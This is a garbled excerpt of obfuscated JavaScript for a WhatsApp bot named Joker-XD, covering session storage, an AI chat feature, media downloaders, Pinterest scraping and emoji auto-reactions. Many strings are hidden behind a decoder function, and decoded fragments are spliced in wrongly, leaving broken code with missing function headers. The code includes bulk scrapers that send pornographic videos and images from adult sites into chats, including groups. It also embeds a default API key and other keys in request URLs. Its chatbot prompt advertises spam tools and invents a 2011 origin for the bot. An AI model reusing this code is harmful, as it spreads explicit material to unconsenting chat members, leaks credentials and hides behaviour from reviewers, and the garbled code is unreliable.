  const dir = path.join(SESSIONS_DIR, num, _0x750c7afa(_0x3c7d8f2f[10]));
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

/** Per-session file path (isolates settings per paired account) */
  return path.join(sessionDataDir(sockOrNum), filename);
}

/** Share-bot meta: king (portal-paired) can /connect children; children cannot */
  const n = String(num || "").replace(/\D/g, "");
  return readJson(path.join(sessionDataDir(n), _0x750c7afa(_0x3c7d8f2f[11])), {
    role: _0x750c7afa(_0x3c7d8f2f[12]),
    parent: null,
    children: []
  });
}
  const n = String(num || "").replace(/\D/g, "");
  writeJson(path.join(sessionDataDir(n), _0x750c7afa(_0x3c7d8f2f[11])), meta);
}
  const meta = getShareMeta(num);
  return meta.role !== _0x750c7afa(_0x3c7d8f2f[13]);
}
  const k = String(kingNum || "").replace(/\D/g, "");
  const c = String(childNum || "").replace(/\D/g, "");
  const meta = getShareMeta(k);
  meta.role = _0x750c7afa(_0x3c7d8f2f[12]);
  meta.children = Array.isArray(meta.children) ? meta.children : [];
  if (!meta.children.includes(c)) meta.children.push(c);
  setShareMeta(k, meta);
  setShareMeta(c, { role: _0x750c7afa(_0x3c7d8f2f[13]), parent: k, children: [] });
}
  const k = String(kingNum || "").replace(/\D/g, "");
  const c = String(childNum || "").replace(/\D/g, "");
  const meta = getShareMeta(k);
  meta.children = (meta.children || []).filter(x => x !== c);
  setShareMeta(k, meta);
}
/** Wipe full session (auth + data) from disk */
  const n = String(num || "").replace(/\D/g, "");
  if (!n) return;
  try { _prefixCache.delete(n); } catch {}
  try {
    const root = path.join(SESSIONS_DIR, n);
    if (fs.existsSync(root)) fs.rmSync(root, { recursive: true, force: true });
  } catch {}
  try {
    // also clean parent children list if any parent points here
    for (const other of listSessionNumbers()) {
      const m = getShareMeta(other);
      if ((m.children || []).includes(n)) {
        m.children = m.children.filter(x => x !== n);
        setShareMeta(other, m);
      }
    }
  } catch {}
}

  try {
    return fs.readdirSync(SESSIONS_DIR).filter(n => {
      try {
        return fs.statSync(path.join(SESSIONS_DIR, n)).isDirectory()
          && fs.existsSync(path.join(SESSIONS_DIR, n, _0x750c7afa(_0x3c7d8f2f[10])));
      } catch { return false; }
    });
  } catch { return []; }
}

// ==================== JOKER-XD DOWNLOAD (Keith + multi-API — no yt-dlp, no Venom) ====================
  timeout: 60000,
  headers: {
    _0x750c7afa(_0x3c7d8f2f[14]): _0x750c7afa(_0x3c7d8f2f[15]),
    Accept: _0x750c7afa(_0x3c7d8f2f[16])
  },
  validateStatus: () => true
};

// ==================== FREE AI (Joker-XD style — no personal API key) ====================

// Lightweight in-memory chat history (per chat jid). Max ~12 msgs + 24h expiry → very low RAM load
// No disk writes, no DB — auto-cleans so server stays light

  if (!entry || !Array.isArray(entry.messages)) return;
  const cutoff = Date.now() - AI_HISTORY_TTL_MS;
  entry.messages = entry.messages.filter((m) => m.ts >= cutoff);
  if (entry.messages.length > AI_HISTORY_MAX_MSGS) {
    entry.messages = entry.messages.slice(-AI_HISTORY_MAX_MSGS);
  }
}

  const key = String(jid || "");
  if (!key) return [];
  const entry = aiChatHistory.get(key);
  if (!entry) return [];
  pruneAiHistory(entry);
  if (!entry.messages.length) {
    aiChatHistory.delete(key);
    return [];
  }
  return entry.messages.map((m) => ({ role: m.role, content: m.content }));
}

  const key = String(jid || "");
  if (!key) return;
  let entry = aiChatHistory.get(key);
  if (!entry) {
    entry = { messages: [], lastActive: Date.now() };
    aiChatHistory.set(key, entry);
  }
  const text = String(content || "").trim().slice(0, AI_HISTORY_MAX_CHARS);
  if (!text) return;
  entry.messages.push({ role, content: text, ts: Date.now() });
  entry.lastActive = Date.now();
  pruneAiHistory(entry);
}

// Occasional cleanup of stale chats (very cheap)
setInterval(() => {
  const now = Date.now();
  for (const [k, entry] of aiChatHistory.entries()) {
    if (!entry || now - (entry.lastActive || 0) > AI_HISTORY_TTL_MS) {
      aiChatHistory.delete(k);
    } else {
      pruneAiHistory(entry);
      if (!entry.messages.length) aiChatHistory.delete(k);
    }
  }
}, 30 * 60 * 1000).unref?.();

// OpenRouter key: env OPENROUTER_API_KEY overrides; default is the key you provided
  || _0x750c7afa(_0x3c7d8f2f[17]);


IDENTITY / ORIGIN:
- Your developer created you in 2011.
- Due to public demand, v1 was publicly released in 2025.
- Current version is Joker-XD multi-tenant WhatsApp bot.
- Keep replies clear, concise, friendly. Light emoji when natural.

WHAT YOU KNOW (normal user level only):
- All public bot commands, their usage, aliases, and what they do (menu, group tools, download, spam tools, settings, welcome/goodbye, getpp, antidelete, antiedit, save/send, etc.).
- How to use commands with the active prefix (usually ".").
- General help for a normal WhatsApp user of this bot.

STRICT RULES — NEVER break these:
1) NEVER share, describe, or leak any private bot source code, JavaScript files, internal code, server code, pairing logic, auth, or implementation details.
2) NEVER share API keys, tokens, endpoints that are private, OpenRouter keys, or any secret. If asked for API/key: reply exactly that you do not have permission to give that.
3) If someone asks for private/source/JS/code of this or any private bot: refuse politely — no permission.
4) If someone asks private/developer-only questions (internal config, secrets, private channels beyond public help): tell them to go to the support channel and ask the Developer.
5) Do not invent admin/owner secrets. Stay at simple end-user knowledge.
6) You may explain public commands and usage freely._0x750c7afa(_0x3c7d8f2f[18])${m.role === _0x750c7afa(_0x3c7d8f2f[19]) ? _0x750c7afa(_0x3c7d8f2f[20]) : _0x750c7afa(_0x3c7d8f2f[21])}: ${m.content}_0x750c7afa(_0x3c7d8f2f[22])[Previous chat]\n${contextPrefix}\n[Current]\nUser: _0x750c7afa(_0x3c7d8f2f[23])${contextPrefix}${q}_0x750c7afa(_0x3c7d8f2f[24])Bearer ${OPENROUTER_API_KEY}_0x750c7afa(_0x3c7d8f2f[25])${KEITH_API}/ai/${model}?q=${encodeURIComponent(qWithContext)}_0x750c7afa(_0x3c7d8f2f[26])https://mistral.stacktoy.workers.dev/?apikey=Suhail&text=${encodeURIComponent(qWithContext)}_0x750c7afa(_0x3c7d8f2f[27])https://llama.gtech-apiz.workers.dev/?apikey=Suhail&text=${encodeURIComponent(qWithContext)}_0x750c7afa(_0x3c7d8f2f[28])${KEITH_API}/search/yts?query=${encodeURIComponent(query)}_0x750c7afa(_0x3c7d8f2f[29])https://apissupreme.vercel.app/media/ytmp3?apikey=supreme&url=${encodeURIComponent(url)}_0x750c7afa(_0x3c7d8f2f[30])https://apissupreme.vercel.app/media/ytmp4?apikey=supreme&url=${encodeURIComponent(url)}_0x750c7afa(_0x3c7d8f2f[31])${String(title).slice(0, 60)}.mp3_0x750c7afa(_0x3c7d8f2f[32])https://media.cypherxbot.space/download/youtube/video?url=${encodeURIComponent(url)}_0x750c7afa(_0x3c7d8f2f[33])https://yt-dl.officialhectormanuel.workers.dev/?url=${encodeURIComponent(url)}_0x750c7afa(_0x3c7d8f2f[34])https://apissupreme.vercel.app/media/ytmp4?apikey=supreme&url=${encodeURIComponent(url)}_0x750c7afa(_0x3c7d8f2f[35])in_${Date.now()}.bin_0x750c7afa(_0x3c7d8f2f[36])out_${Date.now()}.mp3_0x750c7afa(_0x3c7d8f2f[37])"${FFMPEG_PATH}" -y -i "${inF}" -vn -acodec libmp3lame -q:a 2 "${outF}"_0x750c7afa(_0x3c7d8f2f[38])https://eliteprotech-apis.zone.id/facebook?url=${encodeURIComponent(url)}_0x750c7afa(_0x3c7d8f2f[39])https://eliteprotech-apis.zone.id/igdl?url=${encodeURIComponent(url)}_0x750c7afa(_0x3c7d8f2f[40])https://www.xvideos.com/?k=${encodeURIComponent(query)}_0x750c7afa(_0x3c7d8f2f[41])https://www.xnxx.com/search/${encodeURIComponent(query)}_0x750c7afa(_0x3c7d8f2f[42])v-${Date.now()}-${Math.floor(Math.random() * 99999)}.mp4_0x750c7afa(_0x3c7d8f2f[43])User-Agent: ${ADULT_UA}\r\nReferer: ${origin}\r\n_0x750c7afa(_0x3c7d8f2f[44])"${FFMPEG_PATH}" -y -headers "${hdr.replace(/"/g, _0x750c7afa(_0x3c7d8f2f[45]))}_0x750c7afa(_0x3c7d8f2f[46])${info.hls}" -t 600 -fs ${maxBytes} -c copy -bsf:a aac_adtstoasc -movflags +faststart "${dest}_0x750c7afa(_0x3c7d8f2f[47])skip_0x750c7afa(_0x3c7d8f2f[48])small_0x750c7afa(_0x3c7d8f2f[49])Server disk is full_0x750c7afa(_0x3c7d8f2f[50])big_0x750c7afa(_0x3c7d8f2f[51])Download failed" + (lastErr ? ` (${String(lastErr).slice(0, 80)})` : ""));
}

/** Send a downloaded file (video or document) and always delete it afterwards */
  const title = res.title || fallbackTitle;
  const mb = (res.size / 1048576).toFixed(1);
  const caption = `🎬 ${title}\n📦 ${mb} MB`;
  const fileName = `${(title || "video_0x750c7afa(_0x3c7d8f2f[52])_0x750c7afa(_0x3c7d8f2f[53])video_0x750c7afa(_0x3c7d8f2f[54])video_0x750c7afa(_0x3c7d8f2f[55])video/mp4_0x750c7afa(_0x3c7d8f2f[56])video/mp4_0x750c7afa(_0x3c7d8f2f[57])video/mp4_0x750c7afa(_0x3c7d8f2f[58])combo_0x750c7afa(_0x3c7d8f2f[59])This video is too large to send_0x750c7afa(_0x3c7d8f2f[60])xnxx") return page === 0 ? `https://www.xnxx.com/search/${q}` : `https://www.xnxx.com/search/${q}/${page}`;
  return `https://www.xvideos.com/?k=${q}&p=${page}`;
}

  const seen = new Set();
  for (let page = 0; page < 40; page++) {
    let items = [];
    try {
      items = adultParseResults(await adultFetchHtml(adultSearchUrl(site, query, page)), adultSiteBase(site), 80);
    } catch (e) {
      if (page === 0) throw e;
      break;
    }
    const fresh = items.filter((i) => !seen.has(i.url));
    if (!fresh.length) break;
    for (const it of fresh) { seen.add(it.url); yield it; }
  }
}

// ---- bulk jobs ----

  const key = mcKey(sock, jid);
  const reply = (text) => sock.sendMessage(jid, { text }, { quoted: msg });
  if (adultJobs.has(key)) { await reply(`⏳ A download is already running in this chat. Send *${prefix}stopdl* to cancel it.`); return; }
  const job = { cancel: false };
  adultJobs.set(key, job);
  adultSweepTmp();
  let sent = 0, skipped = 0, failed = 0, tried = 0, diskFull = false;
  try {
    await reply(`⬇️ Starting *${label}*\n🔎 ${query}\n🔢 Target: ${amount} • ${ADULT_MODE_LABEL[mode]}\n\n_Send ${prefix}stopdl to cancel._`);
    const maxTry = Math.max(amount * 8, 40);
    for await (const item of adultCandidates(site, query)) {
      if (job.cancel || sent >= amount || tried >= maxTry) break;
      tried++;
      try {
        const r = await adultFetchVideo(item.url, site, mode);
        if (r.skipped) { skipped++; continue; }
        await adultSendFile(sock, jid, msg, r, item.title);
        sent++;
      } catch (e) {
        failed++;
        if (/disk/i.test(e.message || "")) { diskFull = true; break; }
      }
      await adultSleep(2000);
    }
  } catch (e) {
    await reply(`❌ ${e.response?.status ? "Search unavailable (HTTP _0x750c7afa(_0x3c7d8f2f[61]))" : (e.message || e)}`);
  } finally {
    adultJobs.delete(key);
    adultSweepTmp();
  }
  let t = `${job.cancel ? "🛑 Stopped_0x750c7afa(_0x3c7d8f2f[62])✅ Done_0x750c7afa(_0x3c7d8f2f[63])ℹ️ Finished"} — sent *${sent}/${amount}*`;
  if (skipped) t += `\n⏭️ Skipped (${mode === "docs_0x750c7afa(_0x3c7d8f2f[64])under 64 MB_0x750c7afa(_0x3c7d8f2f[63])too long/large"}): ${skipped}`;
  if (failed) t += `\n⚠️ Failed: ${failed}`;
  if (diskFull) t += `\n❌ Server disk is full — free some space and try again.`;
  else if (!job.cancel && sent < amount) t += `\n_No more matching videos found for this search._`;
  await reply(t);
}

// ---- pending prompts the user can reply to ----
  if (!id) return;
  const now = Date.now();
  for (const [k, v] of adultPending) if (v.expires < now) adultPending.delete(k);
  adultPending.set(mcKey(sock, jid) + ":_0x750c7afa(_0x3c7d8f2f[65])_0x750c7afa(_0x3c7d8f2f[66])@g.us");
  let t = `🔞 *${label}*\n🔎 ${query}\n\n`;
  list.forEach((v, i) => {
    t += `*${i + 1}.* ${v.title}\n`;
    if (!group) t += `🔗 ${v.url}\n`;
    t += "\n_0x750c7afa(_0x3c7d8f2f[67])1 Only videos / 2 Only documents / 3 Combo" for a bulk request */
  const t =
    `🔞 *${params.label}*\n🔎 ${params.query}\n🔢 Amount: ${params.amount}\n\n` +
    `Choose download type:\n\n` +
    `*1* — Only videos _(under 64 MB, longer ones are skipped)_\n` +
    `*2* — Only documents _(videos over 64 MB, sent as documents)_\n` +
    `*3* — Combo _(both)_\n\n` +
    `_Reply to this message with 1, 2 or 3._`;
  const sent = await sock.sendMessage(jid, { text: t }, { quoted: msg });
  adultRememberList(sock, jid, sent?.key?.id, { kind: "mode_0x750c7afa(_0x3c7d8f2f[68])_0x750c7afa(_0x3c7d8f2f[69]):_0x750c7afa(_0x3c7d8f2f[70])mode_0x750c7afa(_0x3c7d8f2f[71])❌ Reply with *1* (Only videos), *2* (Only documents) or *3* (Combo)._0x750c7afa(_0x3c7d8f2f[72])1_0x750c7afa(_0x3c7d8f2f[64])videos_0x750c7afa(_0x3c7d8f2f[73])2_0x750c7afa(_0x3c7d8f2f[64])docs_0x750c7afa(_0x3c7d8f2f[63])combo_0x750c7afa(_0x3c7d8f2f[74])all_0x750c7afa(_0x3c7d8f2f[75])sab_0x750c7afa(_0x3c7d8f2f[76])-").map((x) => parseInt(x, 10));
    for (let i = Math.min(a, b); i <= Math.max(a, b); i++) picks.push(i);
  } else picks = (sel.match(/\d{1,2}/g) || []).map((x) => parseInt(x, 10));
  picks = [...new Set(picks)].filter((x) => x >= 1 && x <= n);

  if (!picks.length) { await reply(`❌ Pick a number between 1 and ${n}, or type *all*.`); return true; }

  try { await sock.sendMessage(jid, { react: { text: "⬇️", key: msg.key } }); } catch {}
  if (picks.length > 1) await reply(`⬇️ Downloading ${picks.length} videos, please wait...`);
  for (const num of picks) {
    const item = entry.list[num - 1];
    try {
      await adultSendVideo(sock, jid, msg, item.url, entry.site, item.title);
    } catch (e) {
      await reply(`❌ #${num} failed: ${e.message || e}`);
    }
    if (picks.length > 1) await delay(1500);
  }
  try { await sock.sendMessage(jid, { react: { text: "✅_0x750c7afa(_0x3c7d8f2f[77])lll_0x750c7afa(_0x3c7d8f2f[78])ll_0x750c7afa(_0x3c7d8f2f[79])arraybuffer_0x750c7afa(_0x3c7d8f2f[80])User-Agent_0x750c7afa(_0x3c7d8f2f[81])image/*" },
        validateStatus: () => true, maxContentLength: 15 * 1024 * 1024
      });
      if (r.status >= 200 && r.status < 300) {
        const b = Buffer.from(r.data);
        if (isImageBuffer(b)) return b;
      }
    } catch {}
  }
  return null;
}

  const key = mcKey(sock, jid);
  const reply = (text) => sock.sendMessage(jid, { text }, { quoted: msg });
  if (adultJobs.has(key)) { await reply(`⏳ A download is already running in this chat. Send *${prefix}stopdl* to cancel it.`); return; }
  const job = { cancel: false };
  adultJobs.set(key, job);
  let sent = 0, tried = 0;
  try {
    const sites = ["xvideos_0x750c7afa(_0x3c7d8f2f[82])xnxx_0x750c7afa(_0x3c7d8f2f[83])/_0x750c7afa(_0x3c7d8f2f[84])/_0x750c7afa(_0x3c7d8f2f[85])/");
      if (!buf) continue;
      try {
        await sock.sendMessage(jid, { image: buf, caption: `🔞 ${it.title}` }, { quoted: msg });
        sent++;
      } catch {}
      await adultSleep(1200);
    }
    if (!sent) await reply(errors >= 2 ? "❌ Search unavailable right now. Try again later._0x750c7afa(_0x3c7d8f2f[63])❌ No pictures found for this search.");
    else if (sent < amount && !job.cancel) await reply(`ℹ️ Sent ${sent}/${amount} — no more pictures found.`);
  } catch (e) {
    await reply(`❌ ${e.message || e}`);
  } finally {
    adultJobs.delete(key);
  }
}

// ==================== PINTEREST SEARCH (.pin) ====================
  "User-Agent_0x750c7afa(_0x3c7d8f2f[86])Accept-Language_0x750c7afa(_0x3c7d8f2f[87])en-US,en;q=0.9_0x750c7afa(_0x3c7d8f2f[88])application/json, text/javascript, */*; q=0.01_0x750c7afa(_0x3c7d8f2f[89])X-Requested-With_0x750c7afa(_0x3c7d8f2f[87])XMLHttpRequest_0x750c7afa(_0x3c7d8f2f[89])X-Pinterest-AppState_0x750c7afa(_0x3c7d8f2f[87])active_0x750c7afa(_0x3c7d8f2f[90])https://www.pinterest.com/"
};

  const m = String(u).match(/^(https?:\/\/i\.pinimg\.com)\/(?:\d+x\d*|originals)\/(.+)$/i);
  if (!m) return [u];
  return [`${m[1]}/originals/${m[2]}`, `${m[1]}/736x/${m[2]}`, `${m[1]}/564x/${m[2]}`, `${m[1]}/474x/${m[2]}`];
}

  const out = [];
  const seen = new Set();
  const add = (u) => {
    if (!u || !/pinimg\.com/i.test(u)) return;
    const m = String(u).match(/pinimg\.com\/[^\/]+\/(.+)$/i);
    const k = m ? m[1] : u;
    if (seen.has(k)) return;
    seen.add(k);
    out.push(u);
  };
  // 1) Pinterest's own search endpoint
  try {
    const data = JSON.stringify({ options: { isPrefetch: false, query, scope: "pins", no_fetch_context_on_resource: false }, context: {} });
    const url = `https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=${encodeURIComponent("/search/pins/?q=" + query)}&data=${encodeURIComponent(data)}&_=${Date.now()}`;
    const r = await axios.get(url, { timeout: 20000, headers: PIN_HEADERS, validateStatus: () => true });
    const results = r.data?.resource_response?.data?.results || [];
    for (const p of results) { const im = p?.images; add(im?.orig?.url || im?.["736x_0x750c7afa(_0x3c7d8f2f[91])474x"]?.url); }
  } catch {}
  // 2) search page HTML
  if (out.length < 10) {
    try {
      const html = await adultFetchHtml(`https://www.pinterest.com/search/pins/?q=${encodeURIComponent(query)}`);
      for (const mm of html.matchAll(/https:\\?\/\\?\/i\.pinimg\.com\\?\/(?:236x|474x|564x|736x|originals)\\?\/[a-f0-9\\\/]+\.(?:jpg|png|webp)/gi)) add(mm[0].replace(/\\/g, ""));
    } catch {}
  }
  // 3) image-search fallback limited to pinterest images
  if (out.length < 10) {
    try {
      const html = await adultFetchHtml(`https://www.bing.com/images/search?q=${encodeURIComponent("site:pinterest.com _0x750c7afa(_0x3c7d8f2f[92])arraybuffer_0x750c7afa(_0x3c7d8f2f[93])User-Agent_0x750c7afa(_0x3c7d8f2f[94])https://www.pinterest.com/_0x750c7afa(_0x3c7d8f2f[95])image/*_0x750c7afa(_0x3c7d8f2f[96])User-Agent_0x750c7afa(_0x3c7d8f2f[97])Accept-Language_0x750c7afa(_0x3c7d8f2f[87])en-US,en;q=0.9_0x750c7afa(_0x3c7d8f2f[98])text_0x750c7afa(_0x3c7d8f2f[99])_0x750c7afa(_0x3c7d8f2f[100])(https:\/\/v\d*\.pinimg\.com\/videos\/[^_0x750c7afa(_0x3c7d8f2f[101])/i)?.[1] || "";
  const og = html.match(/<meta[^>]+property=_0x750c7afa(_0x3c7d8f2f[102])[^>]+content=_0x750c7afa(_0x3c7d8f2f[103])]+)_0x750c7afa(_0x3c7d8f2f[104])([^_0x750c7afa(_0x3c7d8f2f[105])[^>]+property=_0x750c7afa(_0x3c7d8f2f[102])/i)?.[1] || "";
  return { video: video.replace(/\\u002F/g, "/"), image: adultDecodeEntities(og) };
}

// ---- free image generation with automatic fallback ----
  if (!b || b.length < 2000) return false;
  return (b[0] === 0xff && b[1] === 0xd8) || (b[0] === 0x89 && b[1] === 0x50) || (b.slice(0, 4).toString() === _0x750c7afa(_0x3c7d8f2f[106]) && b.slice(8, 12).toString() === _0x750c7afa(_0x3c7d8f2f[107]));
}
  const res = await axios.request({ url, method: opts.method || _0x750c7afa(_0x3c7d8f2f[108]), data: opts.data, responseType: _0x750c7afa(_0x3c7d8f2f[109]), timeout: 90000, maxRedirects: 8, headers: { _0x750c7afa(_0x3c7d8f2f[14]): ADULT_UA, ...(opts.headers || {}) }, validateStatus: () => true });
  if (res.status < 200 || res.status >= 400) throw new Error(_0x750c7afa(_0x3c7d8f2f[110]) + res.status);
  const buf = Buffer.from(res.data);
  if (!isImageBuffer(buf)) throw new Error(_0x750c7afa(_0x3c7d8f2f[111]));
  return buf;
}
  const enc = encodeURIComponent(prompt);
  const key = process.env.POLLINATIONS_KEY || "";
  const auth = key ? { Authorization: `Bearer ${key}` } : {};
  const providers = [
    () => fetchImageBuf(`https://image.pollinations.ai/prompt/${enc}?width=1024&height=1024&nologo=true&model=flux&seed=${Math.floor(Math.random() * 999999)}`, { headers: auth }),
    () => fetchImageBuf(`https://image.pollinations.ai/prompt/${enc}?width=768&height=768&nologo=true&model=turbo&seed=${Math.floor(Math.random() * 999999)}`, { headers: auth }),
    () => fetchImageBuf(`https://pollinations.ai/p/${enc}?width=768&height=768&seed=${Math.floor(Math.random() * 999999)}`, { headers: auth }),
    async () => {
      const { data } = await axios.get(`https://hercai.onrender.com/v3/text2image?prompt=${enc}`, { timeout: 60000 });
      if (!data?.url) throw new Error(_0x750c7afa(_0x3c7d8f2f[112]));
      return fetchImageBuf(data.url);
    },
    () => fetchImageBuf(`https://api.airforce/imagine2?prompt=${enc}&size=1:1&seed=${Math.floor(Math.random() * 999999)}`),
  ];
  if (process.env.HF_TOKEN) {
    providers.push(() => fetchImageBuf(_0x750c7afa(_0x3c7d8f2f[113]), {
      method: _0x750c7afa(_0x3c7d8f2f[114]), data: { inputs: prompt }, headers: { Authorization: `Bearer ${process.env.HF_TOKEN}`, _0x750c7afa(_0x3c7d8f2f[115]): _0x750c7afa(_0x3c7d8f2f[116]), Accept: _0x750c7afa(_0x3c7d8f2f[117]) }
    }));
  }
  const errs = [];
  for (const run of providers) {
    try { return await run(); } catch (e) { errs.push(e.message || String(e)); }
  }
  console.warn(_0x750c7afa(_0x3c7d8f2f[118]), errs.join(_0x750c7afa(_0x3c7d8f2f[119])));
  throw new Error(_0x750c7afa(_0x3c7d8f2f[120]));
}

/** Send video/audio/image by URL, fallback to buffer (Joker-XD pattern) */
  const opts = quoted ? { quoted } : {};
  // direct buffer support
  if (extra && extra.buffer) {
    const buf = Buffer.isBuffer(extra.buffer) ? extra.buffer : Buffer.from(extra.buffer);
    const { buffer: _b, ...rest } = extra;
    if (type === _0x750c7afa(_0x3c7d8f2f[121])) await sock.sendMessage(jid, { video: buf, mimetype: _0x750c7afa(_0x3c7d8f2f[122]), ...rest }, opts);
    else if (type === _0x750c7afa(_0x3c7d8f2f[123])) await sock.sendMessage(jid, { audio: buf, mimetype: rest.mimetype || _0x750c7afa(_0x3c7d8f2f[124]), ...rest }, opts);
    else if (type === _0x750c7afa(_0x3c7d8f2f[125])) await sock.sendMessage(jid, { image: buf, ...rest }, opts);
    else if (type === _0x750c7afa(_0x3c7d8f2f[126])) await sock.sendMessage(jid, { document: buf, ...rest }, opts);
    return;
  }
  if (!mediaUrl) throw new Error(_0x750c7afa(_0x3c7d8f2f[127]));
  // local file path support
  if (String(mediaUrl).startsWith(_0x750c7afa(_0x3c7d8f2f[128]))) {
    const fp = mediaUrl.replace(_0x750c7afa(_0x3c7d8f2f[128]), "");
    const buf = fs.readFileSync(fp);
    try { fs.unlinkSync(fp); } catch {}
    if (type === _0x750c7afa(_0x3c7d8f2f[121])) await sock.sendMessage(jid, { video: buf, mimetype: _0x750c7afa(_0x3c7d8f2f[122]), ...extra }, opts);
    else if (type === _0x750c7afa(_0x3c7d8f2f[123])) await sock.sendMessage(jid, { audio: buf, mimetype: extra.mimetype || _0x750c7afa(_0x3c7d8f2f[124]), ...extra }, opts);
    else if (type === _0x750c7afa(_0x3c7d8f2f[125])) await sock.sendMessage(jid, { image: buf, ...extra }, opts);
    else if (type === _0x750c7afa(_0x3c7d8f2f[126])) await sock.sendMessage(jid, { document: buf, ...extra }, opts);
    return;
  }
  try {
    if (type === _0x750c7afa(_0x3c7d8f2f[121])) {
      await sock.sendMessage(jid, { video: { url: mediaUrl }, mimetype: _0x750c7afa(_0x3c7d8f2f[122]), ...extra }, opts);
      return;
    }
    if (type === _0x750c7afa(_0x3c7d8f2f[123])) {
      await sock.sendMessage(jid, { audio: { url: mediaUrl }, mimetype: extra.mimetype || _0x750c7afa(_0x3c7d8f2f[124]), ...extra }, opts);
      return;
    }
    if (type === _0x750c7afa(_0x3c7d8f2f[125])) {
      await sock.sendMessage(jid, { image: { url: mediaUrl }, ...extra }, opts);
      return;
    }
    if (type === _0x750c7afa(_0x3c7d8f2f[126])) {
      await sock.sendMessage(jid, { document: { url: mediaUrl }, ...extra }, opts);
      return;
    }
  } catch {}
  const buf = await downloadUrlBuffer(mediaUrl);
  if (type === _0x750c7afa(_0x3c7d8f2f[121])) await sock.sendMessage(jid, { video: buf, mimetype: _0x750c7afa(_0x3c7d8f2f[122]), ...extra }, opts);
  else if (type === _0x750c7afa(_0x3c7d8f2f[123])) await sock.sendMessage(jid, { audio: buf, mimetype: extra.mimetype || _0x750c7afa(_0x3c7d8f2f[124]), ...extra }, opts);
  else if (type === _0x750c7afa(_0x3c7d8f2f[125])) await sock.sendMessage(jid, { image: buf, ...extra }, opts);
  else if (type === _0x750c7afa(_0x3c7d8f2f[126])) await sock.sendMessage(jid, { document: buf, ...extra }, opts);
}



// Process-level flags so auto-reconnect does NOT re-send welcome / stack presence intervals

// WhatsApp group approval ceiling used by .approve. The server may enforce a lower limit.




// ==================== AUTO REACT / PRESENCE ====================

  return {
    enabled: false, all: false, dm: false, groups: {}, status: false,
    command: false, // react on valid bot commands
    reactMode: _0x750c7afa(_0x3c7d8f2f[129]), reactEmojis: [...DEFAULT_REACT_EMOJIS], reactIndex: 0,
    record: { all: false, dm: false, groups: {} },
    type: { all: false, dm: false, groups: {} },
    recordtype: { all: false, dm: false, groups: {} }
  };
}
  const file = sock ? sf(sock, _0x750c7afa(_0x3c7d8f2f[130])) : autoReactFile;
  const b = defaultAutoReactConfig(), c = readJson(file, {});
  return {
    ...b, ...c,
    groups: { ...b.groups, ...(c.groups || {}) },
    record: { ...b.record, ...(c.record || {}), groups: { ...b.record.groups, ...(c.record?.groups || {}) } },
    type: { ...b.type, ...(c.type || {}), groups: { ...b.type.groups, ...(c.type?.groups || {}) } },
    recordtype: { ...b.recordtype, ...(c.recordtype || {}), groups: { ...b.recordtype.groups, ...(c.recordtype?.groups || {}) } }
  };
}

  try {
    for (const { segment } of new Intl.Segmenter(undefined, { granularity: _0x750c7afa(_0x3c7d8f2f[131]) }).segment(String(text)))
      if (/\p{Extended_Pictographic}/u.test(segment)) return segment;
  } catch {
    const m = String(text).match(/\p{Extended_Pictographic}/u);
    if (m) return m[0];
  }
  return null;
}

/** AI react: understand message meaning (EN) and pick a fitting emoji */
  const existing = emojiFromText(text);
  if (existing) return existing;
  const t = String(text || "").toLowerCase();
  // Love / heart
  if (/\b(love|miss you|i love|pyar|mohabbat|dil|❤️|janu|baby)\b/.test(t)) return _0x750c7afa(_0x3c7d8f2f[132]);
  // Happy / laugh
  if (/\b(haha|lol|lmao|rofl|funny|joke|hehe|😂|😄|mazak|hasna)\b/.test(t)) return _0x750c7afa(_0x3c7d8f2f[133]);
  // Sad
  if (/\b(sad|cry|hurt|depressed|lonely|dukhi|rona|😢|😭)\b/.test(t)) return _0x750c7afa(_0x3c7d8f2f[134]);
  // Angry
  if (/\b(angry|mad|hate|gussa|bakar|stupid|idiot|🤬|😡)\b/.test(t)) return _0x750c7afa(_0x3c7d8f2f[135]);
  // Thanks
  if (/\b(thanks|thank you|shukriya|thx|ty)\b/.test(t)) return _0x750c7afa(_0x3c7d8f2f[136]);
  // Hello / hi
  if (/\b(hello|hi|hey|salam|assalam|aoa|good morning|good night|gn|gm)\b/.test(t)) return _0x750c7afa(_0x3c7d8f2f[137]);
  // Fire / cool
  if (/\b(fire|lit|cool|awesome|amazing|zabardast|bohat acha|🔥)\b/.test(t)) return _0x750c7afa(_0x3c7d8f2f[138]);
  // Prayer / religion
  if (/\b(allah|islam|namaz|quran|ramadan|inshallah|mashallah|alhamdulillah)\b/.test(t)) return _0x750c7afa(_0x3c7d8f2f[139]);
  // Food
  if (/\b(food|khana|hungry|pizza|biryani|eat|dinner|lunch)\b/.test(t)) return _0x750c7afa(_0x3c7d8f2f[140]);
  // Music
  if (/\b(song|music|gana|listen|spotify|rap)\b/.test(t)) return _0x750c7afa(_0x3c7d8f2f[141]);
  // Party
  if (/\b(party|birthday|celebrate|mubarak|congrats|congratulations)\b/.test(t)) return _0x750c7afa(_0x3c7d8f2f[142]);
  // Sleep / night
  if (/\b(sleep|tired|neend|soja|good night|gn)\b/.test(t)) return _0x750c7afa(_0x3c7d8f2f[143]);
  // Question
  if (/\?|kya|what|why|kaise|how|kab|when|where/.test(t)) return _0x750c7afa(_0x3c7d8f2f[144]);
  // OK / yes
  if (/\b(ok|okay|yes|haan|han|sure|done|theek)\b/.test(t)) return _0x750c7afa(_0x3c7d8f2f[145]);
  // No
  if (/\b(no|nahi|nope|never)\b/.test(t)) return _0x750c7afa(_0x3c7d8f2f[146]);
  // Default positive
  return _0x750c7afa(_0x3c7d8f2f[147]);
}

  if (cfg.reactMode === _0x750c7afa(_0x3c7d8f2f[148])) return aiReactionFromText(text);
  const pool = Array.isArray(cfg.reactEmojis) && cfg.reactEmojis.length ? cfg.reactEmojis : DEFAULT_REACT_EMOJIS;
  const i = Number.isInteger(cfg.reactIndex) ? cfg.reactIndex : 0;
  const emoji = pool[i % pool.length];
  cfg.reactIndex = (i + 1) % pool.length;
  return emoji;
}

  if (!cfg.enabled) return false;
  if (cfg.all) return true;
  return kind === _0x750c7afa(_0x3c7d8f2f[149]) ? !!cfg.dm : !!cfg.groups?.[jid];
}

/** Menu-style emoji for each command (+ aliases) — used by .autoreact command */
  // MAIN
